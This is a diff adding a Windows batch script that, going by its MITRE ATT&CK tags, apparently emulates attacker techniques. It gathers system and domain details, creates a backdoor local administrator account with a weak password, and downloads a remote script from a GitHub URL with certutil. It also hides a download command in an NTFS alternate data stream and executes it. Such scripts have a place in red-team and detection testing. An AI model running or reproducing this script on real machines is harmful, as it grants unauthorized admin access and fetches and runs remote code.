@@ -1,0 +1,48 @@
+@ECHO OFF
+
+echo "" 
+systeminfo | findstr /c:"OS Name"
+echo "" 
+systeminfo | findstr /c:"OS Version"
+echo "" 
+systeminfo | findstr /c:"System Type"
+echo "" 
+systeminfo | findstr /c:"Domain"
+
+echo "" 
+echo "" 
+nltest /sc_query:lab
+echo "" 
+nltest /dclist:lab
+echo "" 
+nltest /dcname:lab
+echo "" 
+nltest /sc_reset:lab
+echo "" 
+
+echo "" 
+net accounts
+echo "" 
+net localgroup
+echo "" 
+net user Administrator
+echo "" 
+
+echo "" 
+net user user1 admin123 /add /lab
+net localgroup Administrators user1 /add
+
+echo "" 
+::Mitre:T1105
+certutil.exe -urlcache -split -f https://raw.githubusercontent.com/jozems/sec/master/hli.script hli.script
+
+::Mitre:T1170
+::Add content to ADS
+::cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/jozems/sec/master/exec.bat ^scrobj.dll > usualfile.txt:payload.bat
+cmd.exe /c echo certutil.exe -urlcache -split -f https://raw.githubusercontent.com/jozems/sec/master/exec.bat exec.bat > usualfile.txt:payload.bat
+
+::exec it
+cmd.exe - < usualfile.txt:payload.bat
+
+
+
